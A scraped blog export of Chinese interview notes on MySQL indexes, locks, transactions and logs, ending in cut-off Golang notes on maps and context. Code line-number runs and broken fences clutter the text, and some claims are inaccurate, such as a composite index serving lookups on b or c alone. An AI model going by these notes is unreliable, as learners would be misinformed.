:最低级别，任何情况都无法保证。 SQL查看隔离级别： @@transaction_isolation;```123设置隔离级别：```set session transaction isolation level read uncommitted; 生产环境数据库一般用的什么隔离级别呢？生产环境大多使用RC(读已提交)， 12缘由一：在可重复读RR隔离级别下，存在**间隙锁**，导致出现死锁的几率比RC大的多！ 缘由二：在RR隔离级别下，条件列未命中索引会锁表！而在RC隔离级别下，只锁行! InnoDB的默认隔离级别：可重复读，不能避免幻读多版本并发控制协议MVCC(Multi- Version Concurrency Control) 索引https://zhuanlan.zhihu.com/p/340593296 什么是索引索引是存储引擎用于提高数据库表的访问速度的一种数据结构。它可以比作一本字典的目录，可以帮你快速找到对应的记录。索引一般存储在磁盘的文件中，它是占用物理空间的。 索引的分类（按字段特性） 主键索引：primary key，在创建表的时候一起创建，一张表最多只有一个主键索引，索引列的值不允许有空值。123456create table A( x int primary key, //或 x int, primary key(x) using BTREE); 建表后，创建主键索引CREATE INDEX a ON tableA(a);再将其添加主键约束ALTER TABLE tableA ADD CONTRAINT id PRIMARY KEY 如果仅改一个主键ALTER TABLE tableA ADD PRIMARY KEY(a) 唯一索引：unique key建立在 UNIQUE 字段上的索引，一张表可以有多个唯一索引，索引列的值必须唯一，但是允许有空值。1234create table A&#123; x int unique key, unique key(x)&#125; 建表后，创建唯一索引create UNIQUE INDEX index_name ON table_name(index_column_1,index_column_2,...); 普通索引/二级索引: 1CREATE INDEX idx on tableA(a,b,x,y); 前缀索引: 对字符类型字段的前几个字符建立的索引，而不是在整个字段上建立的索引 1234CREATE TABLE tableA( a varchar(255), INDEX(a(10))//字符串前10个字符匹配。); 【面试考点】联合索引如何使用的指按sql里从左到右的顺序去匹配，查询条件中存在与联合索引中最左侧字段相匹配的字段，则就会使用该字段过滤一批数据，直至联合索引中全部字段匹配完成 失效的情况如果有abc索引，可以支持查找时的 a/b/c/ac/cba(打乱)，不支持bc 联合索引范围查询 联合索引的最左匹配原则会一直向右匹配直到遇到「范围查询」就会停止匹配。也就是范围查询的字段可以用到联合索引，但是在范围查询字段的后面的字段无法用到联合索引。 【例子】 * from tableA where a> 10 and b12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849```select * from tableA where a&gt;= 10 and b=2;```的区别：a都用了索引，一个没用，一个用了。因为对于联合索引，是先按照 a 字段的值排序，然后在 a 字段的值相同的情况下，再按照 b 字段的值进行排序 ## 索引的优缺点？优点：- 加快数据查找的速度- 为用来排序或者是分组的字段添加索引，可以加快分组和排序的速度- 加快表与表之间的连接缺点：- 建立索引需要占用物理空间- 会降低表的增删改的效率，因为每次对表记录进行增删改，需要进行动态维护索引，导致增删改时间变长## 什么情况下需要建索引？- 经常**用于查询**的字段- 经常**用于连接**的字段建立索引，可以加快连接的速度- 经常**需要排序**的字段建立索引，因为索引已经排好序，可以加快排序查询速度## 什么情况下不建索引？- where条件中用不到的字段不适合建立索引- 表记录较少。比如只有几百条数据，没必要加索引。- 需要经常增删改。需要评估是否适合加索引- 参与列计算的列不适合建索引- 区分度不高的字段不适合建立索引，如性别，只有男/女/未知三个值。加了索引，查询效率也不会提高。## 哈希索引哈希索引是基于哈希表实现的，对于每一行数据，存储引擎会对索引列进行哈希计算得到哈希码，并且哈希算法要尽量保证不同的列值计算出的哈希码值是不同的，将哈希码的值作为哈希表的key值，将指向数据行的指针作为哈希表的value值。这样查找一个数据的时间复杂度就是O(1)，一般多用于精确查找。## 【面试题】InnoDB为什么用B+树做索引innodb用的聚簇索引，把索引和数据一起存放，数据在叶子节点有序存放，非叶子存放索引（key和页号）；一个是有序存放适合范围查找，不需要遍历整棵树，一个是达到减少磁盘IO次数的作用。![](/images/innodbb%2Btree.webp)因为B+树可以实现**有序存放**和**减少磁盘IO**知识点：1. 适合范围查找：普通二分查找树 由于树是存储在磁盘中的，访问每个节点，都对应一次磁盘 I/O 操作（假设一个节点的大小「小于」操作系统的最小读写单位块的大小），也就是说树的高度就等于每次查询数据时磁盘 IO 操作的次数，所以树的高度越高，就会影响查询性能。2. 在 B+ 树中，叶子节点和非叶子节点的数据结构是一样的，区别在于，叶子节点存放的是实际的行数据，而非叶子节点存放的是主键和页号。## 为什么 B+ 和 B树- 从存储情况来说，B+只有叶子有数据，B树所有节点都有数据，这样就增加了磁盘IO次数- B+ 的非叶子结点仅有关键字，适合搜索B 树的内部节点既包含关键字也包含指向实际数据的指针，而 B+ 树的内部节点仅包含关键字，实际数据只存储在叶子节点中。这使得 B+ 树在磁盘存储和范围查询等方面具有优势，适合作为数据库索引的数据结构### 【再问】为什么不用B树B树和B+的时间复杂度查找都是O(logN)，但是B 树可能会因为树的分支过多，导致需要进行多次磁盘访问。并且B+支持多级索引，很容易扩展。- 更适合磁盘存储： B+ 树的叶子节点形成了一个有序链表，这使得范围查询的效率非常高，因为相邻的元素会被存储在相邻的位置，可以在一个或者很少几个相邻的节点中找到所有需要的数据。B+ 树的叶子节点包含了所有的数据记录，这意味着每次查找都可以直接定位到具体的数据行，而不需要额外的中间层节点来获取实际数据。 123- 支持多级索引B+ 树可以很容易地扩展为多级索引。在多级索引中，每一层都是一个独立的 B+ 树，它们之间通过指针进行连接。这样的设计使得在大量数据的情况下也可以保持高效的检索速度。 举例来说，假设我们有一个三级索引 (a, b, c)，那么：第一级索引以 a 为键构建一颗 B+ 树，每个节点中存储 b 的值以及指向第二级索引的指针。第二级索引以 b 为键构建一颗 B+ 树，每个节点中存储 c 的值以及指向第三级索引的指针。第三级索引以 c 为键构建一颗 B+ 树，叶子节点中存储了对应的数据记录。这样的设计使得在多级索引中，每一层都能帮助缩小搜索范围，从而提高查询效 其中，叶子节点和非叶子节点的数据结构是一样的，区别在于，叶子节点存放的是实际的行数据，而非叶子节点存放的是主键和页号。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889## 【面试】 索引失效的情况https://mp.weixin.qq.com/s/mwME3qukHBFul57WQLkOYg- 左/左右模糊匹配`like %a`- 使用函数，但是8.0之后出现了函数索引- 表达式计算- 隐式类型转换，比如name是varchar，查询时使用`select 8 from A where name=11111;`- 联合索引的非**最左匹配**：- WHERE 里面的 OR操作，导致全表扫描：OR 前的条件列是索引列，而在 OR 后的条件列不是索引列，解决办法将其都加上索引。## MySQL什么情况下索引会失效1. 组合索引时，如果查询条件没有使用最左边的字段，就不会使用索引2. like进行匹配时，如果字符串前面含有%百分号，就会全表扫描时，不使用索引，3. 还有一种情况，是如果查询条件中类型是字符串，没有引号，发生了隐式转换就不会使用索引4. 对索引列进行运算5. 判断索引列是否不等于某个值时6. 查询条件使用or连接，也会导致索引失效## 【面试题】索引下推是什么，回表是什么- **explain会显示Extra字段为using index condition，表示使用了索引下推**- 查询的时候截断的字段不会在 Server 层进行条件判断，而是会被下推到「存储引擎层」进行条件判断（因为 c 字段的值是在 (a, b, c) 联合索引里的），然后过滤出符合条件的数据后再返回给 Server 层。由于在引擎层就过滤掉大量的数据，无需再回表读取数据来进行判断，减少回表次数，从而提升了性能。- 回表也叫二次查询，指在数据库中执行一个查询，如果查询的字段不在查询的索引中，数据库可能需要通过索引定位到相应的行，然后再去实际的数据页中获取所需的字段值，这个过程就被称为回表。以索引举例，查了两个索引，那么就是先根据第一个索引找到符合要求的值，然后在这些行里用第二个索引进行过滤。## 【面试】最左匹配的一个问题：当where a=1 and c=3时，符合最左匹配吗答案：符合最左，只有a用了索引，c字段没使用严格意义上来说是属于索引截断。- MySQL 5.5 的话，前面 a 会走索引，在联合索引找到主键值后，开始回表，到主键索引读取数据行，Server 层从存储引擎层获取到数据行后，然后在 Server 层再比对 c 字段的值。- 从 MySQL 5.6 之后，有一个索引下推功能，可以在存储引擎层进行索引遍历过程中，对索引中包含的字段先做判断，直接过滤掉不满足条件的记录，再返还给 Server 层，从而减少回表次数。## 【面试】讲一下回表和索引下推的区别- **回表是先通过索引查询行，再访问数据行涉及到两次磁盘访问**- **索引下推是先在索引上执行一部分或全部的查询条件，大大减少磁盘访问次数****回表（Lookup）：**定义：回表是指在使用索引定位到符合查询条件的行后，再次访问实际的数据行，从中获取所需的字段值的过程。过程：使用索引定位到符合查询条件的行的位置。从定位到的位置中读取行的指针或主键。使用指针或主键再次访问实际的数据行，从中获取所需的字段值。代价：回表的代价相对较高，因为它涉及了两次磁盘/内存访问。**索引下推（Index Pushdown）：**定义：索引下推是指在查询执行过程中，数据库管理系统会尝试在索引上执行部分或全部的查询条件，从而减少需要访问实际数据行的次数。过程：当查询中的条件可以在索引中找到匹配项时，数据库会尝试在索引上执行这部分查询条件，以过滤掉不符合条件的行。 只有符合索引条件的行才会被返回给用户。优势：减少了回表的次数，降低了查询的代价，提高了查询的性能。减少了磁盘/内存访问次数，尤其在大型数据集中，效果显著。适用情况：索引下推通常在涉及到范围查询、排序、聚合等操作时可以发挥较大的优化作用。## Hash索引和B+树索引的区别？哈希索引**不支持排序**，因为哈希表是无序的。哈希索引**不支持范围查找**。哈希索引**不支持模糊查询**及组合索引的最左前缀匹配。因为哈希表中会存在哈希冲突，所以哈希索引的性能是**不稳定**的，而B+树索引的性能是**相对稳定的**，每次查询都是从根节点到叶子节点。## 为什么B+树比B树更适合实现数据库索引？【】- 由于B+树的数据都存储在叶子结点中，**叶子结点均为数据，方便扫库**，只需要扫一遍叶子结点即可，但是B树因为其分支结点同样存储着数据，我们要找到具体的数据，需要进行一次中序遍历按序来扫，所以B+树更加适合在区间查询的情况，而在数据库中基于范围的查询是非常频繁的，所以通常B+树用于数据库索引。B+树的节点只存储索引key值，具体信息的地址存在于叶子节点的地址中。这就使以页为单位的索引中可以存放更多的节点。减少更多的I/O支出。B+树的查询效率更加稳定，任何关键字的查找必须走一条从根结点到叶子结点的路。所有关键字查询的路径长度相同，导致每一个数据的查询效率相当## 什么是覆盖索引？select的数据列只用从索引中就能够取得，不需要回表进行二次查询，也就是说查询列要被所使用的索引覆盖。对于innodb表的二级索引，如果索引能覆盖到查询的列，那么就可以避免对主键索引的二次查询。不是所有类型的索引都可以成为覆盖索引。覆盖索引要存储索引列的值，而哈希索引、全文索引不存储索引列的值，所以MySQL使用b+树索引做覆盖索引。对于使用了覆盖索引的查询，在查询前面使用explain，输出的extra列会显示为using index。比如user_like 用户点赞表，组合索引为(user_id, blog_id)，user_id和blog_id都不为null。```explain select blog_id from user_like where user_id = 13; explain结果的Extra列为Using index，查询的列被索引覆盖，并且where筛选条件符合最左前缀原则，通过索引查找就能直接找到符合条件的数据，不需要回表查询数据。 select user_id from user_like where blog_id 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116explain结果的Extra列为Using where; Using index， 查询的列被索引覆盖，where筛选条件不符合最左前缀原则，无法通过索引查找找到符合条件的数据，但可以通过索引扫描找到符合条件的数据，也不需要回表查询数据。# 数据库引擎## InnoDB存储引擎InnoDB是MySQL默认的事务型存储引擎，使用最广泛，基于**聚簇索引**建立的。InnoDB内部做了很多优化，如能够自动在内存中创建自适应hash索引，以加速读操作。**优点**：支持事务和崩溃修复能力；引入了行级锁和外键约束。**缺点**：占用的数据空间相对较大。**适用场景**：需要事务支持，并且有较高的并发读写频率。### 什么是聚簇索引？【索引结构和数据一起存放的索引，根据主键创建的索引，用B+树创建】InnoDB使用**表的主键构造主键索引树**，同时叶子节点中存放的即为整张表的记录数据。聚集索引叶子节点的存储是逻辑上连续的，使用双向链表连接，叶子节点按照主键的顺序排序，因此对于主键的排序查找和范围查找速度比较快。聚集索引的叶子节点就是整张表的行记录。InnoDB 主键使用的是聚簇索引。聚集索引要比非聚集索引查询效率高很多。对于InnoDB来说，聚集索引一般是表中的主键索引，如果表中没有显示指定主键，则会选择表中的第一个不允许为NULL的唯一索引。如果没有主键也没有合适的唯一索引，那么InnoDB内部会生成一个隐藏的主键作为聚集索引，这个隐藏的主键长度为6个字节，它的值会随着数据的插入自增。### 聚簇和非聚簇索引- 聚簇索引叶子节点存储的是行数据，因此通过聚簇索引可以直接找到真正的行数据；而非聚簇索引叶子节点存储的是主键信息，所以使用非聚簇索引，一般情况还需要回表查询，如果查询的字段命中索引就不需要回表了，比如select age where age = 10.- or：聚簇索引的叶子节点存放的是主键值和数据行，支持覆盖索引 非聚簇索引的叶子节点存放的是主键值或数据记录的地址（InnoDB辅助索引的data域存储相应记录主键的值，MyISAM辅助索引的data域保存数据记录的地址）## MyISAM存储引擎数据以紧密格式存储。对于只读数据，或者表比较小、可以容忍修复操作，可以使用MyISAM引擎。MyISAM会将表存储在两个文件中，数据文件.MYD和索引文件.MYI。**优点**：访问速度快**缺点**：MyISAM不支持事务和行级锁，不支持崩溃后的安全恢复，也不支持外键。**适用场景**：对事务完整性没有要求；表的数据都会只读的。## InnoDB和MyISAM的区别1. myisam支持到表锁，Innodb支持表锁，进一步支持到行锁，粒度更细，解决脏读和不可重复度。使用场景myisam适合读场景多，crud场景少的场景，比如博客这些；innodb适合事务支持，高并发等情况2. myisam不支持事务，innodb有binlog可以恢复数据库3. myisam数据存储是直接查到内存地址，innodb是有数据缓存4. myisam索引是非聚簇索引，索引里只有innodb是聚簇索引## 两者索引的区别【非聚簇索引myisam，看3.】1. myisam使用非聚簇索引，也是b+树，innodb使用聚簇索引，B+树2. myisam的索引和数据存储是分开的，聚簇索引是将数据和索引存储在一起3. 将数据存储于索引分开结构，索引结构的叶子节点指向了数 据的对应行，myisam 通 过 key_buffer 把索引先缓存到内存中，当需要访问 数据时(通过索引访问数据)，在内存中直接 搜索索引，然后通过索引找 到磁盘相应数据，这也就是为什么索引不在 key buffer 命中时，速度慢 的 原因。## 【重点】为什么innodb比myisam慢了点- myisam是非聚簇，索引和数据是分开的，在查询时，可以直接访问到索引文件，而不需要额外的查找操作。- 而在 InnoDB 中，由于使用了聚簇索引，查询时可能需要在索引中定位到主键，再根据主键访问数据行# 事务Transaction## InnoDB 引擎通过什么技术来保证事务的这ACID特性的？- 持久性Durability是通过 redo log（重做日志）来保证的；- 原子性Atomicity 是通过 undo log（回滚日志）来保证的；- 隔离性Isolation是通过 MVCC（多版本并发控制） 或锁机制来保证的；- 一致性Consistency则是通过持久性+原子性+隔离性来保证；*MySQL 并不会使用「串行化」隔离级别来避免幻读现象的发生，因为使用「串行化」隔离级别会影响性能*https://xiaolincoding.com/mysql/transaction/phantom.html#什么是幻读## 可重复读隔离级别是启动事务时生成一个 Read View，然后整个事务期间都在用这个 Read View。## 【面试题】为什么事务要有隔离性，我们就要知道并发事务时会引发什么问题。数据库允许多个并发事务同时对其数据进行读写和修改的能力，隔离性可以防止多个事务并发执行时由于交叉执行而导致数据的不一致，因为多个事务同时使用相同的数据时，不会相互干扰，每个事务都有一个完整的数据空间，对其他并发事务是隔离的。## 多事务的并发进行一般会造成以下几个问题: 锁：共享锁和排他锁（读写锁）# 【面试重点】锁锁分为全局锁，表锁，行锁，下面介绍各锁的使用和场景## 全局锁**应用场景**：全局锁主要应用于做全库逻辑备份，这样在备份数据库期间，不会因为数据或表结构的更新，而出现备份文件的数据与预期的不一样。* 如果在主库备份，在备份期间不能更新，业务停止，所以更新业务会处于等待状态* 如果在从库备份，在备份期间不能执行主库同步的binlog，导致主从延迟**缺点**：意味着整个数据库都是只读状态，备份花时间长，无法执行其他操作。但是MYSQL解决了这个问题，通过**可重复度**，使用ReadView，事务操作时用ReadView，MVCC支持备份与事务同时进行。- 上锁1`flush tables with READ lock;`锁定所有的表，防止其他会话对这些表进行写操作，但允许读操作- 上锁2`lock tables [tablename] READ/WRITE`- `unlock tables;`## 表级锁### 表锁**应用场景**:表级别的共享锁=读锁,独占锁=写锁- 尽量避免在使用 InnoDB 引擎的表使用表锁，因为表锁的颗粒度太大，会影响并发性能- `lock tables [tablename] read/write;` ### 元数据锁**应用场景**不需要显式使用，在CRUD/alter中自动创建，select执行完才可以执行其他操作，- MDL 是在事务提交后才会释放，这意味着事务执行期间，MDL 是一直持有的。 【引申问题】那如果数据库有一个长事务（所谓的长事务，就是开启了事务，但是一直还没提交），首先，线程 A 先启用了事务（但是一直不提交），然后执行一条 select 语句，此时就先对该表加上 MDL 读锁；然后，线程 B 也执行了同样的 select 语句，此时并不会阻塞，因为「读读」并不冲突；接着，线程 C 修改了表字段，此时由于线程 A 的事务并没有提交，也就是 MDL 读锁还在占用着，这时线程 C 就无法申请到 MDL 写锁，就会被阻塞，那么在线程 C 阻塞后，后续有对该表的 select 语句，就都会被阻塞，如果此时有大量该表的 select 语句的请求到来，就会有大量的线程被阻塞住，这时数据库的线程很快就会爆满了。**那么为什么线程 C 因为申请不到 MDL 写锁，而导致后续的申请读锁的查询操作也会被阻塞？**因为申请 MDL 锁的操作会形成一个队列，队列中写锁获取优先级高于读锁，一旦出现 MDL 写锁等待，会阻塞后续该表的所有 CRUD 操作。### 意向锁**用于快速判断表是否加了锁**。因为：如果没有「意向锁」，那么加「独占表锁」时，就需要遍历表里所有记录，查看是否有记录存在独占锁，这样效率会很慢。### 自增锁```java@Id@GeneratedValue(strategy = GenerationType.IDENTITY) // 指定自动生成主键的策略@Column(name = &quot;id&quot;)private int id; 在插入数据的时候，会为被 AUTO_INCREMENT 修饰的字段加上轻量级锁，然后给该字段赋值一个自增的值，就把这个轻量级锁释放了，而不需要等待整个插入语句执行完后才释放锁。 应用场景 行锁记录锁 Record Lock，仅仅把一条记录锁上； 间隙锁 Gap Lock，锁定一个范围，但是不包含记录本身；间隙锁的意义只在于阻止区间被插入 临键锁 Next-Key Lock：Record Lock + Gap Lock 的组合，锁定一个范围，并且锁定记录本身。 【普通的select没有行锁】普通的 select 是不会加行级锁的，普通的 select 语句是利用 MVCC 实现一致性读，是无锁的。记录锁 Record Lock记录锁分为S锁和X锁。 当一个事务对一条记录加了 S 型记录锁后，其他事务也可以继续对该记录加 S 型记录锁（S 型与 S 锁兼容），但是不可以对该记录加 X 型记录锁（S 型与 X 锁不兼容）; 当一个事务对一条记录加了 X 型记录锁后，其他事务既不可以对该记录加 S 型记录锁（S 型与 X 锁不兼容），也不可以对该记录加 X 型记录锁（X 型与 X 锁不兼容）。间隙锁 Gap Lock只存在于可重复读隔离级别，目的是为了解决可重复读隔离级别下幻读的现象。 对间隙加锁是为了防止插入/删除的时候出现幻读 间隙锁之间是兼容的，即两个事务可以同时持有包含共同间隙范围的间隙锁，并不存在互斥关系，因为间隙锁的目的是防止插入幻影记录而提出的。临键锁 Next-key Lock理解为一个范围的间隙锁 【面试题】MYSQL怎么加锁 【加行锁】在查询时对记录加行级锁，这两种查询会加锁的语句称为锁定读。1234567891011//对读取的记录加共享锁(S型锁)select ... lock in share mode;//对读取的记录加独占锁(X型锁)select ... for update;//对操作的记录加独占锁(X型锁)update table .... where id = 1;//对操作的记录加独占锁(X型锁)delete from table where id = 1; 上面这两条语句必须在一个事务中，因为当事务提交了，锁就会被释放，所以在使用这两条语句的时候，要加上 begin 或者 start transaction 开启事务的语句。 普通查询，没有使用索引的话，会导致什么情况？没有使用索引字段作查询条件的话，导致扫描是全表扫描。那么，每一条记录的索引上都会加 临键（NK）锁，这样就相当于锁住的全表，这时如果其他事务对该表进行增、删、改操作的时候，都会被阻塞。 如果在 update 语句的 where 条件没有使用索引，就会全表扫描，于是就会对所有记录加上 next-key 锁（记录锁 + 间隙锁），相当于把整个表锁住了。 这条 update 语句产生了 4 个记录锁（有几条记录就有几个Record锁）和 5 个间隙锁（范围+1），相当于锁住了全表。 那 update 语句的 where 带上索引就能避免全表记录加锁了吗？关键还得看这条语句在执行过程种，优化器最终选择的是索引扫描，还是全表扫描，如果走了全表扫描，就会对全表的记录加锁了。 update 没加索引，加的是表锁还是行锁对每一行都加了NK锁，就锁了整张表。 避免全表锁定将 MySQL 里的 sql_safe_updates 参数设置为 1，开启安全更新模式。 update 语句必须满足如下条件之一才能执行成功： 123使用 where，并且 where 条件中必须有索引列；使用 limit；同时使用 where 和 limit，此时 where 条件中可以没有索引列； delete 语句必须满足以下条件能执行成功： 123同时使用 where 和 limit，此时 where 条件中可以没有索引列；另外：如果 where 条件带上了索引列，但是优化器最终扫描选择的是全表，而不是索引的话，我们可以使用 FORCE INDEX([index_name]) 可以告诉优化器使用哪个索引，以此避免有几率锁全表带来的隐患。 MySQL 记录锁+间隙锁可以防止删除操作而导致的幻读吗？【可以】插入意向锁插入意向锁的生成时机： 每插入一条新记录，都需要看一下待插入记录的下一条记录上是否已经被加了间隙锁，如果已加间隙锁，此时会生成一个插入意向锁，然后锁的状态设置为等待状态（PS：MySQL 加锁时，是先生成锁结构，然后设置锁的状态，如果锁状态是等待状态，并不是意味着事务成功获取到了锁，只有当锁状态为正常状态时，才代表事务成功获取到了锁），现象就是 Insert 语句会被阻塞。 三大日志binlog，归档日志，逻辑日志，属于Server层，与引擎无关保证一致性C；用于数据库的数据备份、主备、主主、主从复制 事务执行过程中，先把日志写到binlog cache，事务提交的时候，再把binlog cache写到binlog文件中，事务一次性写入，后台给一个线程去写 三种模式：statement、row和mixed. statement模式下,记录单元为语句.即每一个sql造成的影响会记录.由于sql的执行是有上下文的,因此在保存的时候需要保存相关的信息,同时还有一些使用了函数之类的语句无法被记录复制. row级别下,记录单元为每一行的改动,基本是可以全部记下来但是由于很多操作,会导致大量行的改动(比如alter table),因此这种模式的文件保存的信息太多,日志量太大. mixed. 一种折中的方案,普通操作使用statement记录,当无法使用statement的时候使用row. show master status在my.ini文件中 查看bin_log文件位置 redolog：宕机恢复数据，物理日志Redo Log记录的是新数据的备份。 保证持久性D 查询一条记录，会从硬盘把一页的数据加载出来，加载出来的数据叫数据页，会放入到 Buffer Pool 中 后续的查询都是先从 Buffer Pool 中找，没有命中再去硬盘加载，减少硬盘 IO 开销，提升性能 更新表数据的时候，也是如此，发现 Buffer Pool 里存在要更新的数据，就直接在 Buffer Pool 里更新，然后会把修改内容记录到redologbuffer里，接着刷盘到 redo log 文件里 undolog：回滚，缺点-写操作较多在操作任何数据之前，首先将数据备份到一个地方（这个存储数据备份的地方称为UndoLog）。然后进行数据的修改。如果出现了错误或者用户执行了ROLLBACK语句，系统可以利用Undo Log中的备份将数据恢复到事务开始之前的状态。 保证原子性A 所有事务进行的修改都会先记录到这个回滚日志中，然后再执行相关的操作 MVCC 的实现依赖于：隐藏字段、Read View、undo log。在内部实现中，InnoDB 通过数据行的 DB_TRX_ID 和 Read View 来判断数据的可见性，如不可见，则通过数据行的 DB_ROLL_PTR 找到 undo log 中的历史版本。每个事务读到的数据版本可能是不一样的，在同一个事务中，用户只能看到该事务创建 Read View 之前已经提交的修改和该事务本身做的修改 刷盘时机 每条 redo 记录由“表空间号+数据页号+偏移量+修改数据长度+具体修改的数据”组成 https://gitee.com/mydb/interview如何做增量备份 mysqldump 做一个全备 mysqlbinlog 做一个增量备份 innodb使用自增ID当主键【顺序添加，uuid插入值会造成页面的碎片和不紧凑的索引结构】如果表使用自增主键，那么每次插入新的记录，记录就会顺序添加到当前索引节点的后续位置，当一页写满，就会自动开辟一个新的页。如果使用非自增主键（如果身份证号或学号等），由于每次插入主键的值近似于随机，因此每次新纪录都要被插到现有索引页得中间某个位置， 频繁的移动、分页操作造成了大量的碎片，得到了不够紧凑的索引结构，后续不得不通过OPTIMIZE TABLE（optimize table）来重建表并优化填充页面 MyISAM和InnoDB使用B+树做索引，区别是什么【innodb使用聚簇，myisam使用非聚簇】 Innodb的聚簇：数据在叶子节点有序存放，非叶子存放key和页号，也就是一棵B+树的索引文件本身就可以是数据文件，找到了索引就找到了对应的行数据。 叶节点存key和data。data域存放的是数据记录的地址，在索引检索的时候，首先按照B+Tree搜索算法搜索索引，如果指定的key存在，则取出其data域的值，然后以data域的值为地址读取相应的数据记录，这被称为“非聚簇索引”mysql自增主键不连续的情况原因有三个:1) 唯一键冲突2) 事务回滚3) insert…select的时候会出现主键id每次双倍分配导致主键id跳过的问题 高并发场景下，如何安全修改同一行数据 悲观锁，innodb的事务支持加行锁 乐观锁，每次修改时先判断版本号是否一直，如果更改了就返回失败/重试，使用版本号机制，或者CAS算法实现 CAS算法 select …for update语句是我们经常使用手工加锁语句。用来锁定特定的行（如果有where子句，就是满足where条件的那些行）。当这些行被锁定后，其他会话可以选择这些行，但不能更改或删除这些行，直到该语句的事务被commit语句或rollback语句结束为止 超大数据如果mysql limit加载超多10000，如何解决 如果id连续，分离出来几个范围查找 利用子查询优化超多分页场景。（先快速定位需要获取的id段，然后再关联） order by id 10000，10 更改业务，一般不需要那么多数量 千万数据，可以用分库分表优化表结构 分表方案（水平分表，垂直分表，切分规则hash等） 分库分表一些问题（事务问题？跨节点Join的问题） 分库分表中间件（Mycat，sharding-jdbc等） 解决方案（分布式事务等如何做） 【思格】简述count(1)、count(*)与count(列名)的执行区别 ?count(*)：包括了所有的列，相当于行数，在统计结果的时候， 不会忽略列值为NULLcount(1)：包括了忽略所有列，用1代表代码行，在统计结果的时候， 不会忽略列值为NULLcount(列名)：只包括列名那一列，在统计结果的时候，会忽略列值为空（这里的空不是只空字符串或者0，而是表示null）的计数， 即某个字段值为NULL时，不统计。执行效率上： 列名为主键，count(列名)会比count(1)快列名不为主键，count(1)会比count(列名)快如果表多个列并且没有主键，则 count（1） 的执行效率优于 count（）如果有主键，则 select count（主键）的执行效率是最优的如果表只有一个字段，则 select count（）最优。","categories":[{"name":"Mysql","slug":"Mysql","permalink":"http://waynamigo.github.io/categories/Mysql/"}],"tags":[{"name":"面试","slug":"面试","permalink":"http://waynamigo.github.io/tags/面试/"},{"name":"Mysql","slug":"Mysql","permalink":"http://waynamigo.github.io/tags/Mysql/"}]},{"title":"Golang questions","slug":"2023-01-02-面经Go问题","date":"2023-01-01T16:00:00.000Z","updated":"2023-12-02T03:49:16.797Z","comments":true,"path":"2023/01/02/2023-01-02-面经Go问题/","link":"","permalink":"http://waynamigo.github.io/2023/01/02/2023-01-02-面经Go问题/","excerpt":"Golang questions","text":"Golang questions 利用通信，也就是封装内部实现，提供接口的方式来进行相应的操作 make 和new的区别分配内存的类型，返回值来回答make专门给引用类型分配内存+初始化，返回的是一个对象的引用new用来为其他类型分配内存，返回的是对象的指针（也可以new一个map，返回的指针指向全是0值的map对象 map数据结构是什么，底层是基于哈希表实现的，碰撞冲突用的是开链法 hmap存的是哈希结构，里面包含一个bmap，B，extra字段，bmap存的时bucket，B用于扩容，extra存溢出的bucket指针 bucket的数量是通过B计算的 = 2^B，每个bucket包含8个kv对，和一个overflow指针，用于开链解决冲突， bmap存的是topbits[8], keys[8] values[8] overflow指针(移动到hmap的extra字段) 查一个kv的时候，怎么查的 myMap[“key0”] 对key0做哈希函数；，这个时候落到某个桶中，再查找hashcode高8位，也就是在bmap中查找topbits[8]来查找在桶的哪个位置 map扩容是怎么做的增量扩容时机是插入时，计算这个map的装载因子，大于6.5时把bucket的2^B +1，才进行扩容。 loadfactor = count / 2^B 大于6.5。发生增量扩容，B+1，然后rehash重新分配kv到不同bucket 等量扩容是overflow的bucket过多是发生当1. B小于15时，overflow的bucket超过2^B个；当2. B大于15时，超过2^15个，hasgrowth()函数进行判断，在mapassign的时候进行逐步搬迁 等量扩容，重新计算一次hashcode进行等量扩容 扩容时，会对bucket的内存进行搬迁，先把现有bucket挂到oldbucket字段，然后在插入动作（mapassign）中执行为什么负载因子是6.5至于装载因子为什么选择6.5，以下是go源码中对不同装载因子的测试，其中有四个重要的指标1234%overflow : hmap中拥有溢出桶的bucket数量bytes/entry：平均每对key/elem使用的内存数量hitprobe：查找一个存在的keys所需要的检查的kv数量missprobe：查找一个不存在的key需要检查的kv数量 可以看到，当负载因子过大时会导致查找性能急速下降，但是负载因子太小时又会导致有大量内存被浪费，所以go team最终选择了6.5做负载因子 12345678910111213141516171819202122232425262728293031323334353637// Picking loadFactor: too large and we have lots of overflow// buckets, too small and we waste a lot of space. I wrote// a simple program to check some stats for different loads:// (64-bit, 8 byte keys and elems)// loadFactor %overflow bytes/entry hitprobe missprobe// 4.00 2.13 20.77 3.00 4.00// 4.50 4.05 17.30 3.25 4.50// 5.00 6.85 14.77 3.50 5.00// 5.50 10.55 12.94 3.75 5.50// 6.00 15.27 11.67 4.00 6.00// 6.50 20.90 10.79 4.25 6.50// 7.00 27.14 10.15 4.50 7.00// 7.50 34.03 9.73 4.75 7.50// 8.00 41.10 9.40 5.00 8.00//// %overflow = percentage of buckets which have an overflow bucket// bytes/entry = overhead bytes used per key/elem pair// hitprobe = # of entries to check when looking up a present key// missprobe = # of entries to check when looking up an absent key map遍历讲讲go程序的执行过程：预处理，编译、链接、运行词法分析、语法分析、类型检查、代码生成、编译器优化、链接 go run做了什么：编译、链接、运行 channel和共享内存有什么优劣channel 隐式同步，减少锁的使用 不适合大量数据传输共享内存 显式用锁，性能高 适合大量数据，但难以调试，存在复杂的同步机制 context原理和场景【并发安全的】【withtimeout超时取消，withvalue传递共享数据】确切的说它是 goroutine 的上下文，包含了 goroutine 的运行状态、环境、现场等信息。作用的话一般是用取消信号，控制超时context用于多个goroutine之间进行通信和控制的官方库，实现并发控制，包括取消信号、控制超时时间注意点 不要将 Context 塞到结构体里。直接将 Context 类型作为函数的第一参数，而且一般都命名为 ctx。 不要向函数传入一个 nil 的 context，如果你实在不知道传什么，标准库给你准备好了一个 context：todo。 不要把本应该作为函数参数的类型塞到 context 中，context 存储的应该是一些共同的数据。例如：登陆的 session、cookie 等。 ctx, cancel := context.WithCancel(context.Background())defer cancel() // 避免其他地方忘记 cancel，且重复调用不影响 原理，Context.Value查找Context 指向它的父节点，链表则指向下一个节点。通过 WithValue 函数，可以创建层层的 valueCtx，存储 goroutine 间可以共享的变量。取值的过程，实际上是一个递归查找的过程，它会顺着链路一直往上找，比较当前节点的 key是否是要找的 key，如果是，则直接返回 value。否则，一直顺着 context 往前，最终找到根节点（一般是 